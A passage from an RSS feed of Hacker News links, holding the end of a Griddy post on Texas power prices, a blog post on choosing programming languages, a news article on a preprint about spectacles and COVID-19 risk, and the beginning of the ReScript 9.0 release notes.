The PUCT used their authority to ensure a $9/kWh price for generation when the market's true supply and demand conditions called for far less. Why? &nbsp;</p><figure><p><img src="https://assets-global.website-files.com/5df01ca286f5a984f50cd9e2/602f3547d3cfcdac85d1087a_Griddy%20vs%20PUCT%20real-time%20prices.jpg" loading="lazy" alt=""></p></figure><p>The CEO of a fellow innovative retailer shared his distress with the PUCT <a href="http://www.energychoicematters.com/stories/20210218aa.html" target="_blank">here</a>. “Customers blame ERCOT, PUC, TDSPs, and retailers. The one entity that they don’t blame are the generators because they don’t have a face to the customer but they make all the money in these types of events. If you follow the money you will find that generators make all the money.” </p><p>That’s one explanation. Everyone is still trying to figure that out. But here is what we do know: </p><p>The market is supposed to set the prices, not political appointees. </p><p>And here is what we are going to do: </p><p>We intend to fight this for, and alongside, our customers for equity and accountability – to reveal why such price increases were allowed to happen as millions of Texans went without power. </p><p>More to come. &nbsp;</p><p>‍</p></div></div></div>]]>
            </description>
            <link>https://www.griddy.com/post/griddy-update-why-energy-prices-were-sky-high-this-week</link>
            <guid isPermaLink="false">hacker-news-small-sites-26228930</guid>
            <pubDate>Mon, 22 Feb 2021 19:06:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Questions to ask when choosing a programming language]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26228886">thread link</a>) | @feross
<br/>
February 22, 2021 | https://shekhargulati.com/2021/02/12/questions-to-ask-when-choosing-a-programming-language/ | <a href="https://web.archive.org/web/*/https://shekhargulati.com/2021/02/12/questions-to-ask-when-choosing-a-programming-language/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-6502">
	<!-- .entry-header -->

	
	
	<div>
		
<p>This week I had a discussion with one of my friends on how to choose a programming language. It was triggered by multiple discussions I had with our customers on their engineering strategy in the last six months and one question that came multiple times was should we use X programming language for our new initiatives. Some customers were thinking of moving from .NET stack to Java, some banks were thinking about moving to Golang because their technical leaders have watched Monzo talks on Golang, for some it was from Java to Kotlin, and some were thinking of dumping JavaScript for Typescript.</p>



<p>To come up with the answer I try to find answers to following questions in context of the organization:</p>



<ul><li>What is the maturity of the programming language with respect to its community and ecosystem? Should they spend their one innovation token on this language?</li><li>How easy it is to find available talent in the market for that programming language?&nbsp;</li><li>How easy it is for the organization to acquire production engineering know-how for a programming language?</li><li>What are the productivity and efficiency gains that can be achieved from using a programming language? Are those gains aligned with the organization goals?</li><li>What are the use-cases an organization wants to solve with the programming language?</li><li>What is the future of a programming language? For a big enterprise it is important if the language can last for a decade.</li><li>What is the learning curve of the programming language? Can existing staff be upskilled?</li></ul>



<p>There is no correct answer to these questions. Most engineering organizations will end up using multiple programming languages. For example an organization may choose Golang as a general purpose language to build backend services, Python for scripting and data related work, Typescript for building web frontend. It is also possible that an engineering organization might choose Python for building most services and for few where performance and efficiency is important it chooses Golang. I think the important point is defining a small list of programming languages for the organization and documenting when you will choose which programming language.&nbsp;</p>



<p>I use a decision matrix like the one shown below to come up with one possible answer. Depending on which factors are important to the organization they can give them weights and that will impact the score of the language. In the image shown below, language 1 is the winner.</p>



<figure><img src="https://lh6.googleusercontent.com/WGB2gGPDUN24IZXig5kZSGzKwcpwSIfP5dzPMp5gxTpIGw5g5rRlqcsWPSTYDY0QWf6U0D14oL9dfTeRZlDanEwK54XjJIirmMeIGTL62skChi8YxVTBZcpeJyRbnveFCKYW3d7U" alt=""></figure>



<p>As I was writing this post a few more questions came to my mind.&nbsp;</p>



<ul><li>Does a programming language help us write less buggy software?</li><li>Does a programming language have some constructs that help us reduce the essential complexity of the system?</li><li>What constraints does a programming language impose and how do they impact the business goals?</li><li>Can a programming language be a competitive advantage for an organization?</li><li>Can a programming language influence the quality of the development team, the quality of code, and practices they follow?</li><li>Does a programming language influence engineering organization culture?</li><li>Can a programming language over time help average Joe become a good software engineer?</li><li>What makes a programming language future safe? Can we predict it to safeguard us?</li><li>Should a language choice depend on NFRs that you want to achieve?</li><li>How does a programming language influence behavior of a team?</li></ul>



<p>I don’t have answers to all of the above mentioned questions. I am hoping there is academic research done on the above but I am yet to read those papers.</p>



<p>I did some research on why different organizations choose certain languages and I found the following key points.</p>



<ol><li>Gitlab – Ruby – <a href="https://about.gitlab.com/blog/2018/10/29/why-we-use-rails-to-build-gitlab/">Link</a><ul><li>GitHub, a source of inspiration for GitLab, was also based on Rails, making it a logical pick considering his interest in the framework.</li><li>Ruby on Rails ecosystem allows you to shape a lot of functionality at a high quality</li><li>We need a lot of functionality and Ruby on Rails is a way to do it</li><li>Consistent coding practices. You are guided to do the right thing.</li><li>Big community of Ruby gems</li></ul></li><li>CockroachDB – Golang – <a href="https://www.cockroachlabs.com/blog/why-go-was-the-right-choice-for-cockroachdb/">Link</a><ul><li>its support for libraries, interfaces, and tooling positioned it as the right choice for CockroachDB</li><li>Go was designed to scale to large code bases with an emphasis on simplicity and orthogonality of features. The enforced code style, the simple imports and automated import management, the wide variety of linters, the straightforward (and minimal) set of programmatic idioms…all of these attributes of Go are important for clean, understandable code.</li><li>When comparing to Java, we appreciate the tight focus on implementation instead of OOP and abstraction: interfaces can be added when needed, not as an initial, often unnecessary, step.&nbsp;</li><li>When comparing to C++, we appreciate automatic memory management and how there’s rarely more than one way to get something done, for example with static and one-time initializers.</li><li>Go gives better control over memory allocation that impacts garbage collection.</li></ul></li><li>Asana – TypeScript – <a href="https://blog.asana.com/2014/11/asana-switching-typescript/">Link</a><ul><li>Clean JS</li><li>Community Support</li><li>Errors at compile time instead of runtime</li><li>Static typing</li></ul></li><li>American Express – Golang – <a href="https://go.dev/solutions/americanexpress/">Link</a> and <a href="https://americanexpress.io/choosing-go/">Link</a><ul><li>For their assessment, they chose to build a microservice in four different programming languages. They then compared the four languages for speed/performance, tooling, testing, and ease of development.</li><li>While Go may not have been the fastest language tested, its powerful tooling helped bolster its overall results. Go’s built-in testing framework, profiling capabilities, and benchmarking tools impressed the team.</li><li>Reasons<ul><li>Simple and straightforward</li><li>Encourage best practices</li><li>Concurrency</li><li>Tooling</li></ul></li></ul></li><li>Nubank – Clojure – <a href="https://building.nubank.com.br/working-with-clojure-at-nubank/">Link</a><ul><li>Nubank provides services in the finance domain, which is very close to mathematical functions — and functional programming is an excellent fit for both scenarios.</li><li>Clojure, on the other hand, has simple constructs that allow us to focus on the problem we are solving, making evolving the system a small incremental challenge, which doesn’t get that much harder over time.</li><li>Most of our codebase can be understood locally, looking at any given pure function, understanding its outputs for any given set of inputs. There’s rarely any need to reason about or recreate the internal state of objects. Data moves through the system in a composable, inspectable, consistent, and immutable way (without hiding it inside of objects).</li><li>Functional code is much easier to test, and that gives us the confidence to deploy an average of over 50 changes per day in a mission-critical domain.</li><li>Nubank has acquired Cognitect, the US-based software consultancy behind the Clojure programming language and the Datomic database</li></ul></li><li>Janestreet – Ocaml – <a href="https://www.youtube.com/watch?v=v1CmGbOGb2I">Link</a> , <a href="https://queue.acm.org/detail.cfm?id=2038036">Link</a> , and <a href="https://discuss.ocaml.org/t/does-jane-street-use-other-programming-languages-aside-from-ocaml/2761/5">Link</a><ul><li>Brevity of the language and the powerful type system that makes OCaml code very readable</li><li>Powerful abstraction capabilities that reduce boilerplates</li><li>Static type system for ensuring code correctness</li><li>He spoke about some of the fancy type tricks like parametric polymorphism, algebraic data types, type inference, phantom types and type indexed values that add to the expressivity of code.</li><li>Also OCaml hits the sweet spot between expressiveness of code and the performance numbers. The very much tunable GC makes things easier to control.</li></ul></li><li>Starling Bank – Java – <a href="https://www.infoq.com/presentations/starling-bank/">Link</a><ul><li>Exceptions are noisy and difficult to ignore</li><li>Reliable ecosystem (user base, tooling, job market, etc)&nbsp;</li><li>Integrations with legacy third parties (SOAP etc)</li></ul></li><li>KhanAcademy – Golang – <a href="https://blog.khanacademy.org/go-services-one-goliath-project/">Link</a><ul><li>Kotlin was more performant</li><li>Golang used much less memory</li></ul></li><li>Lyft – TypeScript – <a href="https://eng.lyft.com/typescript-at-lyft-64f0702346ea">Link</a><ul><li>Popularity</li><li>Type safety</li><li>Less Bugs</li><li>Productivity</li></ul></li><li>Medium – Golang – <a href="https://medium.engineering/rex-mediums-go-recommendation-microservice-e077bc9582a">Link</a><ul><li>More efficient use of the CPU. While Node is single-threaded, Go is much better suited for the combination of I/O and CPU-intensive operations required to build a ranked feed. Splitting our work onto separate Goroutines means we can avoid the issue of the CPU getting hogged by one single request and other requests getting starved.</li><li>Opinionated. Go makes it pretty hard to write “bad” code. A typed language that is also highly opinionated in terms of code styling means that even a newbie to Go (which I was when we started writing Rex) can quickly start writing clean and readable code.</li><li>Prior experience with Go. While much of Medium’s codebase is written in Node, we already had a few smaller-purpose microservices in Go. Adding another microservice in a language that we as a company have familiarity with makes building and maintaining this new service much easier.</li></ul></li><li>Instagram – Python – <a href="https://instagram-engineering.com/web-service-efficiency-at-instagram-with-python-4976d078e366">Link</a><ul><li>Simplicity</li><li>Practicality</li></ul></li></ol>



<p>I hope this post helps you understand that there is much more to choosing a programming language.</p>



<h5>You can also support me and my work by&nbsp;following me on  <a rel="noreferrer noopener" href="https://softwareleadweekly.us6.list-manage.com/track/click?u=1a258e0fefbb23214c59c5a8d&amp;id=278bdedb31&amp;e=219517c74f" target="_blank"></a><a rel="noreferrer noopener" href="https://twitter.com/shekhargulati" target="_blank">https://twitter.com/shekhargulati</a>.&nbsp;Thank you&nbsp;</h5>



<hr>




	</div><!-- .entry-content -->

	<!-- .entry-footer -->
</article></div>]]>
            </description>
            <link>https://shekhargulati.com/2021/02/12/questions-to-ask-when-choosing-a-programming-language/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26228886</guid>
            <pubDate>Mon, 22 Feb 2021 19:04:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[People Who Wear Spectacles Are About Three Times Less Likely to Catch Covid-19]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26228823">thread link</a>) | @throwawaysea
<br/>
February 22, 2021 | https://www.ibtimes.sg/people-who-wear-spectacles-are-about-three-times-less-likely-catch-covid-19-finds-study-55744 | <a href="https://web.archive.org/web/*/https://www.ibtimes.sg/people-who-wear-spectacles-are-about-three-times-less-likely-catch-covid-19-finds-study-55744">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody" id="v_main"><p>A new study has revealed that people who wear glasses are up to three times less likely to catch novel Coronavirus infections. It was found that the eye protection was "statistically significant" to fight against the SARS-CoV-2 caused disease, COVID-19.</p><p>The study, which was also conducted in India, showed that poor and uneducated people were more likely to contract the novel Coronavirus. According to the research, this was because "they do not follow the preventive guidelines properly" and useless spectacles than the educated people.</p>
<figure itemscope="" itemprop="associatedMedia image" itemtype="https://schema.org/ImageObject"><div>
<picture>
<!--[if IE 9]><video
style="display: none;"><![endif]--><source media="(min-width: 1280px)" sizes="640px" srcset="https://data.ibtimes.sg/en/full/47011/spectacles.jpg?w=640 640w"><source media="(min-width: 1024px)" sizes="640px" srcset="https://data.ibtimes.sg/en/full/47011/spectacles.jpg?w=640 640w"><source media="(min-width: 768px)" sizes="640px" srcset="https://data.ibtimes.sg/en/full/47011/spectacles.jpg?w=640 640w"><source media="(min-width: 480px)" sizes="480px" srcset="https://data.ibtimes.sg/en/full/47011/spectacles.jpg?w=480 480w"><source media="(min-width: 0px)" sizes="400px" srcset="https://data.ibtimes.sg/en/full/47011/spectacles.jpg?w=400 400w"><!--[if IE 9]></video><![endif]-->                    <img id="i47011" src="https://data.ibtimes.sg/en/full/47011/spectacles.jpg?w=640" alt="Spectacles " title="Spectacles " width="640" itemprop="contentUrl">
</picture><meta itemprop="url" content="https://data.ibtimes.sg/en/full/47011/spectacles.jpg"><meta itemprop="width" content="640"><meta itemprop="height" content="427">
<figcaption>
<span itemprop="caption">Glasses wearers up to three times less likely to catch Covid</span>
<span itemprop="copyrightHolder">Pixabay</span>
</figcaption></div>
</figure><h3><strong>Spectacles and COVID-19</strong></h3><p>The research head, Amit Kumar Saxena, said the new study showed that the risk of <a href="https://www.ibtimes.sg/new-traffic-signal-lookalike-technology-could-help-reopen-international-airports-safely-55731" target="_blank">COVID-19</a> was two to three times less in spectacles wearing population while compared to those who do not wear glasses.</p><p>"Protective role of the spectacles was found statistically significant if those were used for a long period of the day. Touching and rubbing of the eyes with contaminated hands may be a significant route of infection," added Saxena.</p><p>During the study, it was also found that people touch their face on average 23 times in an hour and the eyes three times per hour. "Transmission occurs by touching the face, nose, mouth and eyes. Touching one's nose and mouth is significantly reduced when wearing a face mask properly. But wearing a face mask does not protect the eyes," said the study.</p><h3><strong>The COVID-19 Research</strong></h3>
<figure itemscope="" itemprop="associatedMedia image" itemtype="https://schema.org/ImageObject"><div>
<picture>
<!--[if IE 9]><video
style="display: none;"><![endif]--><source media="(min-width: 1280px)" sizes="640px" srcset="https://data.ibtimes.sg/en/full/45807/coronavirus.jpg?w=640 640w"><source media="(min-width: 1024px)" sizes="640px" srcset="https://data.ibtimes.sg/en/full/45807/coronavirus.jpg?w=640 640w"><source media="(min-width: 768px)" sizes="640px" srcset="https://data.ibtimes.sg/en/full/45807/coronavirus.jpg?w=640 640w"><source media="(min-width: 480px)" sizes="480px" srcset="https://data.ibtimes.sg/en/full/45807/coronavirus.jpg?w=480 480w"><source media="(min-width: 0px)" sizes="400px" srcset="https://data.ibtimes.sg/en/full/45807/coronavirus.jpg?w=400 400w"><!--[if IE 9]></video><![endif]-->                    <img id="i45807" src="https://data.ibtimes.sg/en/full/45807/coronavirus.jpg?w=640" alt="Coronavirus " title="Coronavirus " width="640" itemprop="contentUrl">
</picture><meta itemprop="url" content="https://data.ibtimes.sg/en/full/45807/coronavirus.jpg"><meta itemprop="width" content="640"><meta itemprop="height" content="360">
<figcaption>
<span itemprop="caption">Novel Coronavirus infection</span>
<span itemprop="copyrightHolder">Pixabay</span>
</figcaption></div>
</figure><p>The study, which was published in <a href="https://www.medrxiv.org/content/10.1101/2021.02.12.21249710v1" rel="nofollow" target="_blank">medRxiv</a>, included 304 Coronavirus patients. Their glasses-wearing behavior was assessed through a questionnaire. The answers were compared with existing studies of the general population.</p><p>As per the findings of the study, a total of 58 patients showed the behavior of using glasses continuously during the daytime and always on outdoor activities. The risk of Coronavirus infection was found 0.48 in spectacles wearing population as compared to 1.35 in the population not using them.</p><p>"The calculated risk ratio was 0.36. The protective effects of the spectacles were found statistically significant," said the study.</p><p>However, based on the findings it would be ideal for the healthcare workers to use face shields and wear goggles to protect their eyes while treating a <a href="https://www.ibtimes.sg/john-hopkins-expert-predicts-end-coronavirus-sufferings-by-april-us-55730" target="_blank">COVID-19 patient</a>. Scientists also said that wearing glasses does not protect the eyes as much as googles but it could provide some sort of protection.</p></div></div>]]>
            </description>
            <link>https://www.ibtimes.sg/people-who-wear-spectacles-are-about-three-times-less-likely-catch-covid-19-finds-study-55744</link>
            <guid isPermaLink="false">hacker-news-small-sites-26228823</guid>
            <pubDate>Mon, 22 Feb 2021 18:59:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[ReScript 9.0]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26228682">thread link</a>) | @jesperlang
<br/>
February 22, 2021 | https://rescript-lang.org/blog/release-9-0 | <a href="https://web.archive.org/web/*/https://rescript-lang.org/blog/release-9-0">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><h2>Introduction<span><span><a href="#introduction"><svg height="0.8em" width="0.8em" viewBox="0 0 20.003 19.944"><path d="M11.927 7.908a4.819 4.819 0 00-3.968-1.3 5.091 5.091 0 00-2.921 1.508L1.47 11.684a4.82 4.82 0 00.192 7.122 4.994 4.994 0 006.76-.4l3.7-3.776a.109.109 0 00-.067-.184s-.649.029-1.132.006a10.116 10.116 0 01-1.35-.226.308.308 0 00-.243.088l-2.529 2.609a2.733 2.733 0 01-3.583.319 2.64 2.64 0 01-.247-3.951l3.755-3.753a2.7 2.7 0 013.654-.073.108.108 0 00.15 0l1.4-1.4a.114.114 0 00-.003-.157z"></path><path d="M8.076 12.036a4.822 4.822 0 003.967 1.3 5.089 5.089 0 002.922-1.509l3.568-3.568a4.818 4.818 0 00-.192-7.121 5 5 0 00-6.761.4l-3.7 3.777a.108.108 0 00.067.183s.648-.028 1.132-.006a10.151 10.151 0 011.35.226.3.3 0 00.243-.088l2.529-2.608a2.732 2.732 0 013.581-.319 2.638 2.638 0 01.249 3.95l-3.755 3.754a2.706 2.706 0 01-3.654.073.107.107 0 00-.15 0l-1.4 1.4a.113.113 0 00.004.156z"></path></svg></a><a id="introduction"></a></span></span></h2><p>We are happy to announce ReScript 9.0!</p><p>ReScript is a robustly typed language that compiles to efficient and human-readable JavaScript. It comes with one of the fastest build toolchains and offers first class support for interoperating with ReactJS and other existing JavaScript code.</p><p>Use <code>npm</code> to install the newest <a href="https://www.npmjs.com/package/bs-platform/v/9.0.1" rel="noopener noreferrer">9.0.1 release</a> with the following command:</p><pre><div><div><p><code>npm install bs-platform@9.0.1 --save-dev
</code></p></div></div></pre><p>You can also try our new release in the <a rel="noopener noreferrer" href="https://rescript-lang.org/try">Online Playground</a>.</p><p>In this post we will highlight the most notable changes. The full changelog for this release can be found <a href="https://github.com/rescript-lang/rescript-compiler/blob/master/Changes.md#90" rel="noopener noreferrer">here</a>. </p><h2>Compiler Improvements<span><span><a href="#compiler-improvements"><svg height="0.8em" width="0.8em" viewBox="0 0 20.003 19.944"><path d="M11.927 7.908a4.819 4.819 0 00-3.968-1.3 5.091 5.091 0 00-2.921 1.508L1.47 11.684a4.82 4.82 0 00.192 7.122 4.994 4.994 0 006.76-.4l3.7-3.776a.109.109 0 00-.067-.184s-.649.029-1.132.006a10.116 10.116 0 01-1.35-.226.308.308 0 00-.243.088l-2.529 2.609a2.733 2.733 0 01-3.583.319 2.64 2.64 0 01-.247-3.951l3.755-3.753a2.7 2.7 0 013.654-.073.108.108 0 00.15 0l1.4-1.4a.114.114 0 00-.003-.157z"></path><path d="M8.076 12.036a4.822 4.822 0 003.967 1.3 5.089 5.089 0 002.922-1.509l3.568-3.568a4.818 4.818 0 00-.192-7.121 5 5 0 00-6.761.4l-3.7 3.777a.108.108 0 00.067.183s.648-.028 1.132-.006a10.151 10.151 0 011.35.226.3.3 0 00.243-.088l2.529-2.608a2.732 2.732 0 013.581-.319 2.638 2.638 0 01.249 3.95l-3.755 3.754a2.706 2.706 0 01-3.654.073.107.107 0 00-.15 0l-1.4 1.4a.113.113 0 00.004.156z"></path></svg></a><a id="compiler-improvements"></a></span></span></h2><h3>New External Stdlib Configuration<span><span><a href="#new-external-stdlib-configuration"><svg height="0.8em" width="0.8em" viewBox="0 0 20.003 19.944"><path d="M11.927 7.908a4.819 4.819 0 00-3.968-1.3 5.091 5.091 0 00-2.921 1.508L1.47 11.684a4.82 4.82 0 00.192 7.122 4.994 4.994 0 006.76-.4l3.7-3.776a.109.109 0 00-.067-.184s-.649.029-1.132.006a10.116 10.116 0 01-1.35-.226.308.308 0 00-.243.088l-2.529 2.609a2.733 2.733 0 01-3.583.319 2.64 2.64 0 01-.247-3.951l3.755-3.753a2.7 2.7 0 013.654-.073.108.108 0 00.15 0l1.4-1.4a.114.114 0 00-.003-.157z"></path><path d="M8.076 12.036a4.822 4.822 0 003.967 1.3 5.089 5.089 0 002.922-1.509l3.568-3.568a4.818 4.818 0 00-.192-7.121 5 5 0 00-6.761.4l-3.7 3.777a.108.108 0 00.067.183s.648-.028 1.132-.006a10.151 10.151 0 011.35.226.3.3 0 00.243-.088l2.529-2.608a2.732 2.732 0 013.581-.319 2.638 2.638 0 01.249 3.95l-3.755 3.754a2.706 2.706 0 01-3.654.073.107.107 0 00-.15 0l-1.4 1.4a.113.113 0 00.004.156z"></path></svg></a><a id="new-external-stdlib-configuration"></a></span></span></h3><p>This is a long-awaited <a href="https://github.com/rescript-lang/rescript-compiler/pull/2171" rel="noopener noreferrer">feature request</a>. </p><p>Our compiler comes with a set of stdlib modules (such as <code>Belt</code>, <code>Pervasives</code>, etc.) for core functionality. Compiled ReScript code relies on the JS runtime version of these stdlib modules.</p><p>In previous versions, users couldn't ship their compiled JS code without defining a <code>package.json</code> dependency on <code>bs-platform</code>. Whenever a ReScript developer wanted to publish a package just for pure JS consumption / lean container deployment, they were required to use a bundler to bundle up their library / stdlib code, which made things way more complex and harder to understand.</p><p>To fix this problem, we now publish our pre-compiled stdlib JS files as a separate npm package called <a href="https://www.npmjs.com/package/@rescript/std" rel="noopener noreferrer"><code>@rescript/std</code></a>. Each new <code>bs-platform</code> release has a matching <code>@rescript/std</code> release for runtime compatibility.</p><p>We also introduced a new configuration within our <code>bsconfig.json</code> file to tell the compiler to use our pre-compiled package instead:</p><pre><div><div><p>JSON</p><p><code>{
  
  <span>"external-stdlib"</span> : <span>"@rescript/std"</span>
}
</code></p></div></div></pre><p>With this configuration set, compiled JS code will now point to the defined <code>external-stdlib</code> path:</p><div><div><div><pre><code><span>Belt</span>.<span>Array</span>.forEach(<span>[</span><span>1</span>, <span>2</span>, <span>3</span><span>]</span>, (num) <span>=&gt;</span> <span>Js</span>.log(num))
</code></pre></div></div></div><p>The JavaScript output above was compiled with an <code>es6</code> target, but will also work with <code>commonjs</code>.</p><p><strong>Important:</strong> When using this option, you need to make sure that the version number of <code>bs-platform</code> and <code>@rescript/std</code> matches with the same version number in your <code>package.json</code> file, otherwise you'll eventually run into runtime problems due to mismatching stdlib behavior!</p><p>To prevent unnecessary complications, only use this feature when...</p><ul><li><p>You want to ship a library for JS / TS consumers without making them depend on <code>bs-platform</code></p></li><li><p>You can't depend on <code>bs-platform</code> due to toolchain size (docker containers, low-storage deployment devices, etc)</p></li></ul><h3>Less Bundle Bloat when Adding ReScript<span><span><a href="#less-bundle-bloat-when-adding-rescript"><svg height="0.8em" width="0.8em" viewBox="0 0 20.003 19.944"><path d="M11.927 7.908a4.819 4.819 0 00-3.968-1.3 5.091 5.091 0 00-2.921 1.508L1.47 11.684a4.82 4.82 0 00.192 7.122 4.994 4.994 0 006.76-.4l3.7-3.776a.109.109 0 00-.067-.184s-.649.029-1.132.006a10.116 10.116 0 01-1.35-.226.308.308 0 00-.243.088l-2.529 2.609a2.733 2.733 0 01-3.583.319 2.64 2.64 0 01-.247-3.951l3.755-3.753a2.7 2.7 0 013.654-.073.108.108 0 00.15 0l1.4-1.4a.114.114 0 00-.003-.157z"></path><path d="M8.076 12.036a4.822 4.822 0 003.967 1.3 5.089 5.089 0 002.922-1.509l3.568-3.568a4.818 4.818 0 00-.192-7.121 5 5 0 00-6.761.4l-3.7 3.777a.108.108 0 00.067.183s.648-.028 1.132-.006a10.151 10.151 0 011.35.226.3.3 0 00.243-.088l2.529-2.608a2.732 2.732 0 013.581-.319 2.638 2.638 0 01.249 3.95l-3.755 3.754a2.706 2.706 0 01-3.654.073.107.107 0 00-.15 0l-1.4 1.4a.113.113 0 00.004.156z"></path></svg></a><a id="less-bundle-bloat-when-adding-rescript"></a></span></span></h3><p>With each release we keep a close eye on generating code that is optimized for tree-shaking. We also believe that we reached a milestone where ReScript reliably produces output that has almost no impact on our final JS bundle-sizes (this is what we call our "zero-cost" philosophy).</p><p>The bundled code is almost ReScript runtime free because our generated library code fits the tree-shaking principle really well. Tools like <code>esbuild</code> can easily drop unnecessary code and make sure that the final code stays lean.</p><p>We made a small <a href="https://github.com/bobzhang/zero-cost-rescript" rel="noopener noreferrer">demo repo</a> and added the precompiled JS bundles to demonstrate what we've achieved. Check it out!</p><h3>Improved Code Generation for Pattern Matching<span><span><a href="#improved-code-generation-for-pattern-matching"><svg height="0.8em" width="0.8em" viewBox="0 0 20.003 19.944"><path d="M11.927 7.908a4.819 4.819 0 00-3.968-1.3 5.091 5.091 0 00-2.921 1.508L1.47 11.684a4.82 4.82 0 00.192 7.122 4.994 4.994 0 006.76-.4l3.7-3.776a.109.109 0 00-.067-.184s-.649.029-1.132.006a10.116 10.116 0 01-1.35-.226.308.308 0 00-.243.088l-2.529 2.609a2.733 2.733 0 01-3.583.319 2.64 2.64 0 01-.247-3.951l3.755-3.753a2.7 2.7 0 013.654-.073.108.108 0 00.15 0l1.4-1.4a.114.114 0 00-.003-.157z"></path><path d="M8.076 12.036a4.822 4.822 0 003.967 1.3 5.089 5.089 0 002.922-1.509l3.568-3.568a4.818 4.818 0 00-.192-7.121 5 5 0 00-6.761.4l-3.7 3.777a.108.108 0 00.067.183s.648-.028 1.132-.006a10.151 10.151 0 011.35.226.3.3 0 00.243-.088l2.529-2.608a2.732 2.732 0 013.581-.319 2.638 2.638 0 01.249 3.95l-3.755 3.754a2.706 2.706 0 01-3.654.073.107.107 0 00-.15 0l-1.4 1.4a.113.113 0 00.004.156z"></path></svg></a><a id="improved-code-generation-for-pattern-matching"></a></span></span></h3><p>We fine-tuned our pattern matching engine to optimize the JS output even more. Here is an example of a pretty substantial optimization, based on <a href="https://github.com/rescript-lang/rescript-compiler/issues/4924" rel="noopener noreferrer">this issue</a>:</p><pre><div><div><p>RES</p><p><code><span>type</span> test <span>=</span>
  | <span>NoArg</span>
  | <span>AnotherNoArg</span>
  | <span>OtherArg</span>(int)

<span>let</span> test <span>=</span> x <span>=&gt;</span>
  <span>switch</span> x {
  | <span>NoArg</span> <span>=&gt;</span> <span>true</span>
  | _ <span>=&gt;</span> <span>false</span>
  }
</code></p></div></div></pre><p>The snippet above will compile to the following JS output:</p><div><div><div><pre><code><span><span>function</span> <span>test</span>(<span>x</span>)</span>{
  <span>return</span> x === <span>0</span>
}
</code></pre></div></div></div><p>As you can see, the 9.0 compiler removes all the unnecessary <code>typeof</code> checks!</p><p>This is possible because our optimizer will try to analyze several predicates and get rid of redundant ones. More diffs can be found <a href="https://github.com/rescript-lang/rescript-compiler/pull/4927/files?file-filters%5B%5D=.js" rel="noopener noreferrer">here</a>.</p><p>Another important improvement is that we fixed the pattern match offset issue, which lead to the consequence that magic numbers will not be generated for complex pattern matches anymore.</p><p>For those interested in the details, here is a representative diff resulting from this cleanup:</p><pre><div><div><p>DIFF</p><p><code>function is_space(param){
<span>- var switcher = param - 9 | 0;</span>
<span>- if (switcher &gt; 4 || switcher &lt; 0) {</span>
<span>-    return switcher == 23 ; </span>
<span>+ if (param &gt; 13 || param &lt; 9) {</span>
<span>+    return param === 32;</span>
  } else {
<span>-    return switcher !== 2;     </span>
<span>+    return param != 11;</span>
  }    
}
</code></p></div></div></pre><h2>Syntax Improvements<span><span><a href="#syntax-improvements"><svg height="0.8em" width="0.8em" viewBox="0 0 20.003 19.944"><path d="M11.927 7.908a4.819 4.819 0 00-3.968-1.3 5.091 5.091 0 00-2.921 1.508L1.47 11.684a4.82 4.82 0 00.192 7.122 4.994 4.994 0 006.76-.4l3.7-3.776a.109.109 0 00-.067-.184s-.649.029-1.132.006a10.116 10.116 0 01-1.35-.226.308.308 0 00-.243.088l-2.529 2.609a2.733 2.733 0 01-3.583.319 2.64 2.64 0 01-.247-3.951l3.755-3.753a2.7 2.7 0 013.654-.073.108.108 0 00.15 0l1.4-1.4a.114.114 0 00-.003-.157z"></path><path d="M8.076 12.036a4.822 4.822 0 003.967 1.3 5.089 5.089 0 002.922-1.509l3.568-3.568a4.818 4.818 0 00-.192-7.121 5 5 0 00-6.761.4l-3.7 3.777a.108.108 0 00.067.183s.648-.028 1.132-.006a10.151 10.151 0 011.35.226.3.3 0 00.243-.088l2.529-2.608a2.732 2.732 0 013.581-.319 2.638 2.638 0 01.249 3.95l-3.755 3.754a2.706 2.706 0 01-3.654.073.107.107 0 00-.15 0l-1.4 1.4a.113.113 0 00.004.156z"></path></svg></a><a id="syntax-improvements"></a></span></span></h2><h3><code>when</code> -&gt; <code>if</code><span><span><a href="#when---if"><svg height="0.8em" width="0.8em" viewBox="0 0 20.003 19.944"><path d="M11.927 7.908a4.819 4.819 0 00-3.968-1.3 5.091 5.091 0 00-2.921 1.508L1.47 11.684a4.82 4.82 0 00.192 7.122 4.994 4.994 0 006.76-.4l3.7-3.776a.109.109 0 00-.067-.184s-.649.029-1.132.006a10.116 10.116 0 01-1.35-.226.308.308 0 00-.243.088l-2.529 2.609a2.733 2.733 0 01-3.583.319 2.64 2.64 0 01-.247-3.951l3.755-3.753a2.7 2.7 0 013.654-.073.108.108 0 00.15 0l1.4-1.4a.114.114 0 00-.003-.157z"></path><path d="M8.076 12.036a4.822 4.822 0 003.967 1.3 5.089 5.089 0 002.922-1.509l3.568-3.568a4.818 4.818 0 00-.192-7.121 5 5 0 00-6.761.4l-3.7 3.777a.108.108 0 00.067.183s.648-.028 1.132-.006a10.151 10.151 0 011.35.226.3.3 0 00.243-.088l2.529-2.608a2.732 2.732 0 013.581-.319 2.638 2.638 0 01.249 3.95l-3.755 3.754a2.706 2.706 0 01-3.654.073.107.107 0 00-.15 0l-1.4 1.4a.113.113 0 00.004.156z"></path></svg></a><a id="when---if"></a></span></span></h3><p>Starting from 9.0, <a rel="noopener noreferrer" href="https://rescript-lang.org/docs/manual/latest/pattern-matching-destructuring#when-clause"><code>when</code> clauses</a> within a <code>switch</code> statement will automatically convert to the <code>if</code> keyword instead.</p><div><div><div><pre><code><span>switch</span> person1 {
| <span>Student</span>({reportCard: {gpa}}) <span>if</span> gpa &lt; <span>0.5</span> <span>=&gt;</span>
  <span>Js</span>.log(<span>"What's happening"</span>)
| _ <span>=&gt;</span> () 
}
